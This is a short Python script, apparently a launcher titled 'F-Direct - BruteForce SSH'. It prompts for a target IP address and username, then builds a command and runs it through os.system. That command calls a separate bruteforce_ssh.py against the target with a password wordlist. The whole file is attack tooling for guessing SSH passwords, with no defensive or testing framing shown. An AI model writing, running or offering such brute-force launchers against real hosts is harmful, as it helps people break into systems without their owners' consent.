from colorama import init
init() #For adding color, text stlying, etc. Do deinit() to stop.


from colorama import Fore, Style #add color. Use Fore(test), Back(background) and/or Style.
print(Fore.RED + "\n F-Direct - BruteForce SSH")

print(Fore.GREEN)
target_ip = input("\n Enter IP: ")
target_username = input("\n Enter User: ")
print("\n Target IP: " + target_ip)
print("\n Target Username: " + target_username)
attack = 'python bruteforce_ssh.py ' + target_ip + ' -u ' + target_username + " -P wordlist.txt"
print(attack)
    
import os
os.system('cmd /k ' + attack) 
